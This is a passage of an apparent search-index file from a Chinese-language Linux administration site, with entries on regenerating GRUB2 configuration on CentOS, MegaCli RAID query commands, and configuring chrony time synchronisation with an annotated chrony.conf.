\u5f53\u60a8\u5b89\u88c5\u65b0\u7684\u5185\u6838\u6216\u8005\u66f4\u6539\u5f15\u5bfc\u76f8\u5173\u7684\u8bbe\u7f6e\u65f6\uff0c\u901a\u5e38\u9700\u8981\u91cd\u65b0\u751f\u6210\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u4ee5\u786e\u4fdd\u5f15\u5bfc\u52a0\u8f7d\u5668\u80fd\u591f\u8bc6\u522b\u548c\u52a0\u8f7d\u65b0\u7684\u66f4\u6539\u3002 grub2-mkconfig \u547d\u4ee4\u901a\u5e38\u4f1a\u81ea\u52a8\u68c0\u6d4b\u7cfb\u7edf\u4e2d\u5b89\u88c5\u7684\u6240\u6709\u5185\u6838\u548c\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u521b\u5efa\u76f8\u5e94\u7684\u5f15\u5bfc\u83dc\u5355\u9879\u3002 \u4e3b\u8981\u529f\u80fd \u200b \u68c0\u6d4b\u64cd\u4f5c\u7cfb\u7edf\u548c\u5185\u6838 \uff1a\u81ea\u52a8\u641c\u7d22\u5e76\u6dfb\u52a0\u7cfb\u7edf\u4e2d\u6240\u6709\u53ef\u7528\u7684Linux\u5185\u6838\u4ee5\u53ca\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\uff08\u5982Windows\uff09\u7684\u5f15\u5bfc\u9879\u3002 \u200b \u751f\u6210\u5f15\u5bfc\u83dc\u5355 \uff1a\u6839\u636e\u68c0\u6d4b\u5230\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u5185\u6838\uff0c\u4ee5\u53ca /etc/default/grub \u548c /etc/grub.d/ \u4e2d\u7684\u914d\u7f6e\u548c\u811a\u672c\uff0c\u751f\u6210\u4e00\u4e2a\u8be6\u7ec6\u7684\u5f15\u5bfc\u83dc\u5355\u3002 \u200b \u652f\u6301\u81ea\u5b9a\u4e49 \uff1a\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u7f16\u8f91 /etc/default/grub \u6587\u4ef6\u6216\u5728 /etc/grub.d/ \u76ee\u5f55\u4e0b\u6dfb\u52a0\u81ea\u5b9a\u4e49\u811a\u672c\uff0c\u6765\u5f71\u54cd\u751f\u6210\u7684\u914d\u7f6e\u6587\u4ef6\u3002 \u4f7f\u7528 grub2-mkconfig \u65f6\uff0c\u901a\u5e38\u9700\u8981\u4ee5\u8d85\u7ea7\u7528\u6237\u6743\u9650\u8fd0\u884c \u5728\u57fa\u4e8eRed Hat\u7684\u7cfb\u7edf\uff08\u5982CentOS\u6216Fedora\uff09\u4e2d\uff0c\u547d\u4ee4\uff1a sudo grub2-mkconfig -o /boot/grub2/grub.cfg \u8bf7\u6ce8\u610f\uff0c\u76f4\u63a5\u7f16\u8f91 grub.cfg \u6587\u4ef6\u901a\u5e38\u4e0d\u63a8\u8350\uff0c\u56e0\u4e3a\u8be5\u6587\u4ef6\u5728\u8fd0\u884c grub2-mkconfig \u6216\u7cfb\u7edf\u66f4\u65b0\u65f6\u4f1a\u88ab\u8986\u76d6\u3002\u76f8\u53cd\uff0c\u5efa\u8bae\u7f16\u8f91 /etc/default/grub \u6587\u4ef6\u6216\u5728 /etc/grub.d/ \u76ee\u5f55\u4e2d\u6dfb\u52a0\u81ea\u5b9a\u4e49\u811a\u672c\uff0c\u7136\u540e\u4f7f\u7528 grub-mkconfig \u91cd\u65b0\u751f\u6210\u914d\u7f6e\u3002 \u91cd\u65b0\u542f\u52a8\u7cfb\u7edf\u4ee5\u5e94\u7528\u66f4\u6539\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u7981\u7528\u67d0\u4e9b\u9a71\u52a8\u53ef\u80fd\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u56e0\u6b64\u8bf7\u786e\u4fdd\u60a8\u4e86\u89e3\u8fd9\u6837\u505a\u7684\u540e\u679c\u3002\u5982\u679c\u60a8\u7684\u7cfb\u7edf\u4f9d\u8d56\u4e8empt3sas\u9a71\u52a8\u6765\u8bbf\u95ee\u5b58\u50a8\u8bbe\u5907\uff0c\u7981\u7528\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u95ee\u9898\u3002\u5728\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u786e\u4fdd\u60a8\u5df2\u5907\u4efd\u91cd\u8981\u6570\u636e\u548c\u7cfb\u7edf\u914d\u7f6e\u3002 \u5728\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u786e\u4fdd\u60a8\u4e86\u89e3\u7981\u7528\u7279\u5b9a\u9a71\u52a8\u7684\u5f71\u54cd\uff0c\u7279\u522b\u662f\u5982\u679c\u60a8\u7684\u7cfb\u7edf\u4f9d\u8d56\u4e8e\u8be5\u9a71\u52a8\u6765\u8bbf\u95ee\u91cd\u8981\u7684\u786c\u4ef6\u8bbe\u5907\u65f6\u3002\u7981\u7528\u5173\u952e\u7684\u9a71\u52a8\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u6216\u67d0\u4e9b\u529f\u80fd\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\u3002 \u5728CentOS\u7cfb\u7edf\u4e2d\uff0c /boot/grub2 \u548c /boot/grub \u8fd9\u4e24\u4e2a\u76ee\u5f55\u7684\u533a\u522b\u4e3b\u8981\u662f\u7531\u4e8eGRUB\u7248\u672c\u7684\u4e0d\u540c\uff1a 1.GRUB2 \uff08\u8f83\u65b0\u7248\u672c\uff09\uff1aCentOS 7\u53ca\u66f4\u9ad8\u7248\u672c\u9ed8\u8ba4\u4f7f\u7528GRUB2\u4f5c\u4e3a\u5f15\u5bfc\u52a0\u8f7d\u5668\u3002\u5728\u8fd9\u4e9b\u7cfb\u7edf\u4e2d\uff0cGRUB2\u7684\u914d\u7f6e\u6587\u4ef6\u548c\u76f8\u5173\u7684\u5f15\u5bfc\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e /boot/grub2 \u76ee\u5f55\u3002 2.GRUB Legacy \uff08\u8f83\u65e7\u7248\u672c\uff09\uff1a\u5728\u8f83\u65e7\u7684CentOS\u7248\u672c\u4e2d\uff08\u5982CentOS 6\u53ca\u4e4b\u524d\uff09\uff0c\u9ed8\u8ba4\u4f7f\u7528\u7684\u662fGRUB Legacy\u3002\u5728\u8fd9\u4e9b\u7cfb\u7edf\u4e2d\uff0cGRUB Legacy\u7684\u914d\u7f6e\u6587\u4ef6\u548c\u76f8\u5173\u5f15\u5bfc\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e /boot/grub \u76ee\u5f55\u3002 \u4e3b\u8981\u533a\u522b\uff1a 1.\u914d\u7f6e\u6587\u4ef6\u4f4d\u7f6e \uff1a \u5728\u4f7f\u7528GRUB2\u7684CentOS\u7cfb\u7edf\u4e2d\uff0c\u4e3b\u8981\u7684\u914d\u7f6e\u6587\u4ef6\u662f /boot/grub2/grub.cfg \u3002 \u5728\u4f7f\u7528GRUB Legacy\u7684\u8f83\u65e7CentOS\u7cfb\u7edf\u4e2d\uff0c\u4e3b\u8981\u7684\u914d\u7f6e\u6587\u4ef6\u53ef\u80fd\u662f /boot/grub/menu.lst \u6216 /boot/grub/grub.conf \u3002 2.\u529f\u80fd\u548c\u8bbe\u8ba1 \uff1a GRUB2\u76f8\u6bd4\u4e8eGRUB Legacy\u62e5\u6709\u66f4\u591a\u7684\u529f\u80fd\uff0c\u66f4\u597d\u7684\u6a21\u5757\u5316\u8bbe\u8ba1\uff0c\u4ee5\u53ca\u66f4\u6613\u4e8e\u7406\u89e3\u548c\u7ef4\u62a4\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 \u5728\u5b9e\u9645\u64cd\u4f5c\u4e2d\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662fCentOS 7\u6216\u66f4\u9ad8\u7248\u672c\uff0c\u4f60\u51e0\u4e4e\u603b\u662f\u4f1a\u4e0e /boot/grub2 \u76ee\u5f55\u6253\u4ea4\u9053\u3002\u800c\u5bf9\u4e8e\u65e7\u7248CentOS\uff0c\u6bd4\u5982CentOS 6\u53ca\u66f4\u65e9\u7248\u672c\uff0c\u624d\u4f1a\u6d89\u53ca\u5230 /boot/grub \u76ee\u5f55\u3002","title":"\u8bfe\u5916\u77e5\u8bc6\uff1a"},{"location":"system/centos7/Linux%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90%E8%A7%A3%E9%87%8A/","text":"Linux\u7b80\u5355\u6559\u7a0b\u4e2d\u7684\u89e3\u91ca\uff1ahttps://tldp.org/LDP/intro-linux/html/sect_04_01.html#sect_04_01_06","title":"Linux\u7279\u6b8a\u6743\u9650\u89e3\u91ca"},{"location":"system/centos7/MegaCli/","text":"\u4e0b\u8f7d\u547d\u4ee4 Support Documents and Downloads (broadcom.com) \u67e5\u627eMegaCLI MegaCLI 5.5 P2 (broadcom.com) \u5b89\u88c5\uff0c\u89e3\u538b\u540e\u5b89\u88c5rpm\u5305\u3002 [root@VM-0-16-centos MegaCli]# pwd /opt/MegaRAID/MegaCli [root@VM-0-16-centos MegaCli]# ls MegaCli64 MegaCli \u662f\u4e00\u79cd\u7528\u4e8e\u7ba1\u7406\u548c\u914d\u7f6eLSI Logic Corporation\u7684MegaRAID\u63a7\u5236\u5668\u7684\u547d\u4ee4\u884c\u754c\u9762\uff08CLI\uff09\u5de5\u5177\u3002\u8fd9\u4e2a\u5de5\u5177\u975e\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u63a7\u5236\u5668\u548c\u78c1\u76d8\u9635\u5217\u7684\u72b6\u6001\u4fe1\u606f\u3001\u521b\u5efa\u548c\u7ba1\u7406RAID\u9635\u5217\u3001\u7ba1\u7406\u5355\u4e2a\u78c1\u76d8\u9a71\u52a8\u5668\u7b49\u7b49\u3002 \u8fd9\u91cc\u662f\u4e00\u4e9b\u57fa\u672c\u7684 MegaCli \u547d\u4ee4\u793a\u4f8b\uff0c\u53ef\u7528\u4e8e\u8fdb\u884c\u5e38\u89c1\u7684\u7ba1\u7406\u4efb\u52a1\uff1a 1.\u67e5\u770b\u9002\u914d\u5668\u4fe1\u606f *: MegaCli64 -AdpAllInfo -aALL 2.\u67e5\u770b\u903b\u8f91\u78c1\u76d8\u4fe1\u606f : MegaCli64 -LDInfo -Lall -aALL 3.\u67e5\u770b\u7269\u7406\u78c1\u76d8\u4fe1\u606f : MegaCli64 -PDList -aALL 4.\u67e5\u770b\u4e8b\u4ef6\u65e5\u5fd7 : MegaCli64 -AdpEventLog -GetEvents -f events.log -aALL 5.\u7535\u6c60\u5907\u4efd\u72b6\u6001 : MegaCli64 -AdpBbuCmd -aALL \u5728\u4f7f\u7528 MegaCli64 \u547d\u4ee4\u65f6\uff0c\u8bf7\u52a1\u5fc5\u8c28\u614e\uff0c\u56e0\u4e3a\u9519\u8bef\u7684\u547d\u4ee4\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6570\u636e\u4e22\u5931\u3002\u5728\u8fdb\u884c\u4efb\u4f55\u4fee\u6539\u4e4b\u524d\uff0c\u5efa\u8bae\u5148\u5907\u4efd\u91cd\u8981\u6570\u636e\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u5177\u4f53\u547d\u4ee4\u7684\u53c2\u6570\u548c\u9009\u9879\u53ef\u80fd\u4f1a\u6839\u636e\u60a8\u7684\u5177\u4f53\u786c\u4ef6\u914d\u7f6e\u548cMegaCli\u7248\u672c\u800c\u6709\u6240\u4e0d\u540c\uff0c\u56e0\u6b64\u5728\u4f7f\u7528\u4e4b\u524d\u8bf7\u67e5\u770b\u76f8\u5173\u7684\u5e2e\u52a9\u6587\u6863\u6216\u5b98\u65b9\u6307\u5357\u3002\u901a\u5e38\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u5728\u547d\u4ee4\u540e\u6dfb\u52a0 -help \u9009\u9879\u6765\u83b7\u53d6\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f\uff0c\u4f8b\u5982\uff1a MegaCli64 -help","title":"\u67e5\u8be2raid\u5361\u4fe1\u606f-MegaCli\u547d\u4ee4"},{"location":"system/centos7/chronyd/","text":"chrony\u670d\u52a1 chrony \u662f\u7f51\u7edc\u65f6\u95f4\u534f\u8bae \uff08NTP\uff09 \u7684\u591a\u529f\u80fd\u5b9e\u73b0\u3002\u5b83\u53ef\u4ee5\u5c06\u7cfb\u7edf\u65f6\u949f\u4e0eNTP\u670d\u52a1\u5668\uff0c\u53c2\u8003\u65f6\u949f\uff08\u4f8b\u5982GPS\u63a5\u6536\u5668\uff09\u4ee5\u53ca\u4f7f\u7528\u952e\u76d8\u7684\u624b\u52a8\u8f93\u5165\u540c\u6b65\u3002\u5b83\u8fd8\u53ef\u4ee5\u4f5c\u4e3a NTPv4 \uff08RFC 5905\uff09 \u670d\u52a1\u5668\u548c\u5bf9\u7b49\u4f53\u8fd0\u884c\uff0c\u4e3a\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u8ba1\u7b97\u673a\u63d0\u4f9b\u65f6\u95f4\u670d\u52a1\u3002 chrony \u7531\u4e24\u4e2a\u7a0b\u5e8f\u7ec4\u6210\uff0c\u5206\u522b\u662f chronyd \u548c chronyc chronyd \u662f\u4e00\u4e2a\u540e\u53f0\u8fd0\u884c\u7684\u5b88\u62a4\u8fdb\u7a0b\uff0c\u7528\u4e8e\u8c03\u6574\u5185\u6838\u4e2d\u8fd0\u884c\u7684\u7cfb\u7edf\u65f6\u949f\u548c\u65f6\u949f\u670d\u52a1\u5668\u540c\u6b65\u3002\u5b83\u786e\u5b9a\u8ba1\u7b97\u673a\u589e\u51cf\u65f6\u95f4\u7684\u6bd4\u7387\uff0c\u5e76\u5bf9\u6b64\u8fdb\u884c\u8865\u507f\u3002 chronyc \u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u6237\u754c\u9762\uff0c\u7528\u4e8e\u76d1\u63a7\u6027\u80fd\u5e76\u8fdb\u884c\u591a\u6837\u5316\u7684\u914d\u7f6e\u3002\u5b83\u53ef\u4ee5\u5728 chronyd \u5b9e\u4f8b\u63a7\u5236\u7684\u8ba1\u7b97\u673a\u4e0a\u5de5\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e00\u53f0\u4e0d\u540c\u7684\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u5de5\u4f5c\u3002 ntp \u662f\u7f51\u7edc\u65f6\u95f4\u534f\u8bae\uff08Network Time Protocol\uff09\u7684\u7b80\u79f0\uff0c\u901a\u8fc7 udp 123 \u7aef\u53e3\u8fdb\u884c\u7f51\u7edc\u65f6\u949f\u540c\u6b65\u3002 RHEL7 \u4e2d\u9ed8\u8ba4\u4f7f\u7528 chrony \u4f5c\u4e3a\u65f6\u95f4\u670d\u52a1\u5668\uff0c\u4e5f\u652f\u6301NTP\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5\u3002 ntp \u4e0e chrony \u4e0d\u80fd\u540c\u65f6\u5b58\u5728 chrony \u7684\u8bbe\u8ba1\u5373\u4f7f\u5728\u56f0\u96be\u7684\u6761\u4ef6\u4e0b\uff0c\u5982\u95f4\u6b47\u6027\u7f51\u7edc\u8fde\u63a5\u548c\u62e5\u585e\u7684\u7f51\u7edc\uff0c\u4e5f\u80fd\u540c\u6b65\u65f6\u95f4\u3002\u4e0e ntpd \u4e0d\u540c\uff0c\u5b83\u652f\u6301\u901a\u8fc7\u786c\u4ef6\u65f6\u95f4\u6233\u540c\u6b65\u7cfb\u7edf\u65f6\u949f\uff0c\u4ece\u800c\u63d0\u9ad8 LAN \u4e0a\u8ba1\u7b97\u673a\u4e4b\u95f4\u65f6\u95f4\u540c\u6b65\u7684\u51c6\u786e\u6027\u3002\u5b83\u8fd8\u652f\u6301\u624b\u52a8\u8f93\u5165\u540c\u6b65\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u9694\u79bb\u7f51\u7edc\u5185\u6267\u884c\u65f6\u95f4\u6821\u6b63\u3002 chrony\u5b98\u7f51\uff1ahttps://chrony.tuxfamily.org/index.html chrony\u7684\u8bbe\u8ba1\u6027\u80fd\u4e0a\u6bd4ntp\u66f4\u52a0\u597d\uff0c\u8fd9\u4e2a\u662f\u5bf9\u6bd4\uff1ahttps://chrony.tuxfamily.org/comparison.html \u524d\u63d0\u77e5\u8bc6 UTC\u65f6\u95f4 utc\u662f\u534f\u8c03\u4e16\u754c\u65f6\uff0c\u53c8\u79f0\u4e16\u754c\u7edf\u4e00\u65f6\u95f4\u3001\u4e16\u754c\u6807\u51c6\u65f6\u95f4\u3001\u56fd\u9645\u534f\u8c03\u65f6\u95f4\u3002 \u534f\u8c03\u4e16\u754c\u65f6 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) UTC + (+0800) =\u5317\u4eac\u65f6\u95f4 Linux\u67e5\u770b\u672c\u5730UTC\u65f6\u95f4\uff1a date -u Wed Oct 5 18:57:38 UTC 2022 \u5c31\u8fd9\u4e1c\u897f\u4f7f\u7528\u95f0\u79d2\uff0c\u95f0\u79d2\u5bfc\u81f4\u5927\u9762\u79ef\u5b95\u673a \u5c31\u56e0\u4e3a\u8fd9\u4e00\u79d2\u949f\uff0c\u79d1\u6280\u5de8\u5934\u5435\u4e86\u5feb\u5341\u5e74 (qq.com) CST\u65f6\u95f4 \u65f6\u95f4\u7f29\u5199\uff0cCST\u53ef\u89c6\u4e3a\u7f8e\u56fd\u3001\u6fb3\u5927\u5229\u4e9a\u3001\u53e4\u5df4\u6216\u4e2d\u56fd\u7684\u6807\u51c6\u65f6\u95f4\u3002 \u7f8e\u56fd\u4e2d\u90e8\u65f6\u95f4\uff1aCentral Standard Time (USA) UT-6:00 \u6fb3\u5927\u5229\u4e9a\u4e2d\u90e8\u65f6\u95f4\uff1aCentral Standard Time (Australia) UT+9:30 \u4e2d\u56fd\u6807\u51c6\u65f6\u95f4\uff1aChina Standard Time UT+8:00 \u53e4\u5df4\u6807\u51c6\u65f6\u95f4\uff1aCuba Standard Time UT-4:00 GMT\u65f6\u95f4 \u683c\u6797\u5c3c\u6cbb\u6807\u51c6\u65f6\u95f4 \u683c\u6797\u5a01\u6cbb\u5e73\u65f6 (GMT, Greenwich Mean Time) \u4f5c\u4e3a\u4e16\u754c\u65f6\u95f4\u6807\u51c6\uff08UT, Universal Time\uff09 GMT\u662f\u524d\u4e16\u754c\u6807\u51c6\u65f6\uff0cUTC\u662f\u73b0\u4e16\u754c\u6807\u51c6\u65f6\u3002 UTC \u6bd4 GMT\u66f4\u7cbe\u51c6\uff0c\u4ee5\u539f\u5b50\u65f6\u8ba1\u65f6\uff0c\u9002\u5e94\u73b0\u4ee3\u793e\u4f1a\u7684\u7cbe\u786e\u8ba1\u65f6\u3002 \u4f46\u5728\u4e0d\u9700\u8981\u7cbe\u786e\u5230\u79d2\u7684\u60c5\u51b5\u4e0b\uff0c\u4e8c\u8005\u53ef\u4ee5\u89c6\u4e3a\u7b49\u540c\u3002 RTC\u65f6\u95f4 RTC\u662f\u82af\u7247\u5185\u7f6e\u7684\u786c\u4ef6\u65f6\u949f\uff0c\u53ea\u8981\u82af\u7247\u4e0d\u65ad\u7535\uff0c\u5373\u4f7f\u64cd\u4f5c\u7cfb\u7edf\u5173\u673a\u7684\u65f6\u5019\uff0cRTC\u65f6\u949f\u4e5f\u662f\u6b63\u5e38\u5728\u8d70\u7684\uff0c\u6240\u4ee5\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5173\u673a\u91cd\u542f\u540e\uff0c\u53ef\u901a\u8fc7\u8bfb\u53d6RTC\u65f6\u95f4\u6765\u66f4\u65b0\u7cfb\u7edf\u65f6\u95f4\u3002 \u67e5\u770bRTC\u65f6\u95f4 hwclock -r \u7cfb\u7edf\u65f6\u95f4 \u7531\u5185\u6838\u7ef4\u62a4\u7684\u8f6f\u4ef6\u65f6\u949f\u3002\u5b83\u662f\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u4e3b\u65f6\u949f\u3002 \u67e5\u770b\u7cfb\u7edf\u65f6\u95f4 date chrony \u8f6f\u4ef6\u5305 [root@VM-0-16-centos ~]# yum install -y chrony [root@VM-0-16-centos ~]# rpm -ql chrony-3.4-1.el7.x86_64 /etc/NetworkManager/dispatcher.d/20-chrony /etc/chrony.conf /etc/chrony.keys /etc/dhcp/dhclient.d/chrony.sh /etc/logrotate.d/chrony /etc/sysconfig/chronyd /usr/bin/chronyc /usr/lib/systemd/ntp-units.d/50-chronyd.list /usr/lib/systemd/system/chrony-dnssrv@.service /usr/lib/systemd/system/chrony-dnssrv@.timer /usr/lib/systemd/system/chrony-wait.service /usr/lib/systemd/system/chronyd.service /usr/libexec/chrony-helper /usr/sbin/chronyd /usr/share/doc/chrony-3.4 /usr/share/doc/chrony-3.4/COPYING /usr/share/doc/chrony-3.4/FAQ /usr/share/doc/chrony-3.4/NEWS /usr/share/doc/chrony-3.4/README /usr/share/man/man1/chronyc.1.gz /usr/share/man/man5/chrony.conf.5.gz /usr/share/man/man8/chronyd.8.gz /var/lib/chrony /var/lib/chrony/drift /var/lib/chrony/rtc /var/log/chrony chrony\u4f5c\u4e3a\u670d\u52a1\u7aef \u4fee\u6539chrony\u7684\u914d\u7f6e\uff0c\u7136\u540e\u542f\u52a8\u5373\u53ef [root@VM-0-16-centos ~]# cat /etc/chrony.conf server ntpupdate.tencentyun.com iburst # \u4ece\u54ea\u4e2a\u670d\u52a1\u5668\u4e0a\u540c\u6b65\u65f6\u95f4\uff0c\u683c\u5f0f\u4e3a server xxx.xxx.xxx [\u9009\u9879] # \u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u5176\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\u6307\u5b9a\u3002\u5982\u679c\u65e0\u6cd5\u5728\u542f\u52a8\u65f6\u89e3\u6790\u4e3b\u673a\u540d\uff0cchronyd \u5c06\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u518d\u6b21\u5c1d\u8bd5 # \u6b64\u6307\u4ee4\u53ef\u4ee5\u591a\u6b21\u7528\u4e8e\u6307\u5b9a\u591a\u4e2a\u670d\u52a1\u5668\u3002 # \u8be5\u6307\u4ee4\u652f\u6301\u4ee5\u4e0b\u9009\u9879\uff1a # minpoll poll # \u6b64\u9009\u9879\u5c06\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u4e4b\u95f4\u7684\u6700\u5c0f\u95f4\u9694\u6307\u5b9a\u4e3a2\u6b21\u5e42\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u4f8b\u5982\uff0cminpoll 5 \u610f\u5473\u7740\u8f6e\u8be2\u95f4\u9694\u4e0d\u5e94\u4f4e\u4e8e 32\u79d2\u3002\u9ed8\u8ba4\u503c\u4e3a6\uff0864\u79d2\uff09\uff0c\u6700\u5c0f\u503c\u4e3a-7\uff081/128 \u79d2\uff09\uff0c\u6700\u5927\u503c\u4e3a24\uff086 \u4e2a\u6708\uff09\u3002\u8bf7\u6ce8\u610f\uff0c\u77ed\u4e8e6\uff0864 \u79d2\uff09\u7684\u95f4\u9694\u901a\u5e38\u4e0d\u5e94\u4e0e Internet \u4e0a\u7684\u516c\u5171\u670d\u52a1\u5668\u4e00\u8d77\u4f7f\u7528\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u88ab\u89c6\u4e3a\u6ee5\u7528\u3002\u4ec5\u5f53\u670d\u52a1\u5668\u53ef\u8bbf\u95ee\u4e14\u5f80\u8fd4\u5ef6\u8fdf\u77ed\u4e8e 10 \u6beb\u79d2\uff08\u5373\u670d\u52a1\u5668\u5e94\u4f4d\u4e8e\u672c\u5730\u7f51\u7edc\u4e2d\uff09\u65f6\uff0c\u624d\u4f1a\u542f\u7528\u4e9a\u79d2\u7ea7\u95f4\u9694\u3002 # maxpoll poll # \u6b64\u9009\u9879\u5c06\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u4e4b\u95f4\u7684\u6700\u5927\u95f4\u9694\u6307\u5b9a\u4e3a2\u6b21\u5e42\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u4f8b\u5982\uff0cmaxpoll 9 \u8868\u793a\u8f6e\u8be2\u95f4\u9694\u5e94\u4fdd\u6301\u5728\u6216\u4f4e\u4e8e9\uff08512 \u79d2\uff09\u3002\u9ed8\u8ba4\u503c\u4e3a10\uff081024 \u79d2\uff09\uff0c\u6700\u5c0f\u503c\u4e3a -7\uff081/128 \u79d2\uff09\uff0c\u6700\u5927\u503c\u4e3a 24\uff086 \u4e2a\u6708\uff09\u3002 # iburst # chronyd \u5c06\u4ece4-8\u4e2a\u591a\u4e2a\u8bf7\u6c42\u5f00\u59cb\uff0c\u4ee5\u4fbf\u66f4\u5feb\u5730\u8fdb\u884c\u65f6\u949f\u7684\u9996\u6b21\u66f4\u65b0\u3002\u5b83\u8fd8\u4f1a\u5728\u6bcf\u6b21\u4f7f\u7528 chronyc \u4e2d\uff0c\u4ece\u8131\u673a\u72b6\u6001\u5207\u6362\u5230\u8054\u673a\u65f6\u4e5f\u4f1a\u7528\u591a\u4e2a\u8bf7\u6c42\u3002 # burst # chronyd \u6700\u591a\u4f7f\u75284\u4e2a\u8bf7\u6c42 # key ID # NTP \u534f\u8bae\u652f\u6301\u6d88\u606f\u8eab\u4efd\u9a8c\u8bc1\u4ee3\u7801 \uff08MAC\uff09\uff0c\u4ee5\u9632\u6b62\u8ba1\u7b97\u673a\u56e0\u5411\u5176\u53d1\u9001\u6076\u610f\u6570\u636e\u5305\u800c\u5bfc\u81f4\u7cfb\u7edf\u65f6\u95f4\u4e2d\u65ad # nts # \u6b64\u9009\u9879\u542f\u7528\u4f7f\u7528\u7f51\u7edc\u65f6\u95f4\u5b89\u5168\u6027 \uff08NTS\uff09 \u673a\u5236\u7684\u8eab\u4efd\u9a8c\u8bc1\u3002 # certset ID # \u6b64\u9009\u9879\u6307\u5b9a\u5728\u542f\u7528 nts \u9009\u9879\u65f6\u5e94\u4f7f\u7528\u54ea\u7ec4\u53d7\u4fe1\u4efb\u7684\u8bc1\u4e66\u6765\u9a8c\u8bc1\u670d\u52a1\u5668\u7684\u8bc1\u4e66\u3002 # maxdelay # maxdelay 0.3 \u8868\u793a\u5e94\u5ffd\u7565\u5f80\u8fd4\u5ef6\u8fdf\u5927\u4e8e 0.3 \u79d2\u7684\u6d4b\u91cf\u503c\u3002\u9ed8\u8ba4\u503c\u4e3a 3 \u79d2\uff0c\u6700\u5927\u503c\u4e3a 1000 \u79d2\u3002 # offline # \u5982\u679c\u5728\u542f\u52a8 chronyd \u65f6\u65e0\u6cd5\u8bbf\u95ee\u670d\u52a1\u5668\uff0c\u5219\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u8131\u673a\u9009\u9879\u3002chronyd \u4e0d\u4f1a\u5c1d\u8bd5\u8f6e\u8be2\u670d\u52a1\u5668\uff0c\u76f4\u5230\u5b83\u80fd\u591f\u8fd9\u6837\u505a # auto_offline # \u4f7f\u7528\u6b64\u9009\u9879\uff0c\u5f53\u53d1\u9001\u8bf7\u6c42\u5931\u8d25\u65f6\uff0c\u670d\u52a1\u5668\u5c06\u88ab\u5047\u5b9a\u4e3a\u5df2\u8131\u673a\uff0c driftfile /var/lib/chrony/drift # \u8bb0\u5f55\u7cfb\u7edf\u65f6\u949f\u83b7\u5f97/\u4e22\u5931\u65f6\u95f4\u7684\u901f\u7387\u7684\u6587\u4ef6 makestep 1.0 3 #\u5982\u679c\u504f\u79fb\u5927\u4e8e1\u79d2\uff0c\u5141\u8bb8\u5728\u524d\u4e09\u6b21\u66f4\u65b0\u4e2d\u8c03\u6574\u7cfb\u7edf\u65f6\u949f rtcsync # rtcsync \u6307\u4ee4\u542f\u7528\u4e86\u4e00\u79cd\u6a21\u5f0f\uff0c\u5728\u8be5\u6a21\u5f0f\u4e0b\uff0c\u7cfb\u7edf\u65f6\u95f4\u5b9a\u671f\u590d\u5236\u5230 RTC,RTC\u65f6\u95f4\u53ef\u4ee5\u901a\u8fc7hwclock -r\u67e5\u770b\u3002 #hwtimestamp * # \u5728\u6240\u6709\u652f\u6301\u786c\u4ef6\u65f6\u95f4\u6233\u7684\u63a5\u53e3\u4e0a\u542f\u7528\u786c\u4ef6\u65f6\u95f4\u6233. #minsources 2 # \u6307\u4ee4\u8bbe\u7f6e\u5728\u66f4\u65b0\u672c\u5730\u65f6\u949f\u4e4b\u524d\uff0c\u9700\u8981\u5728\u6e90\u9009\u62e9\u7b97\u6cd5\u4e2d\u88ab\u89c6\u4e3a\u53ef\u9009\u62e9\u7684\u6e90\u7684\u6700\u5c0f\u6570\u76ee\u3002\u9ed8\u8ba4\u503c\u4e3a 1\u3002\u5c06\u6b64\u9009\u9879\u8bbe\u7f6e\u4e3a\u8f83\u5927\u7684\u6570\u5b57\u53ef\u7528\u4e8e\u63d0\u9ad8\u53ef\u9760\u6027\u3002\u66f4\u591a\u7684\u6e90\u5c06\u4e0d\u5f97\u4e0d\u76f8\u4e92\u540c\u610f\uff0c\u5e76\u4e14\u5f53\u53ea\u6709\u4e00\u4e2a\u6e90\uff08\u53ef\u80fd\u63d0\u4f9b\u4e0d\u6b63\u786e\u7684\u65f6\u95f4\uff09\u53ef\u8bbf\u95ee\u65f6\uff0c\u65f6\u949f\u5c06\u4e0d\u4f1a\u66f4\u65b0 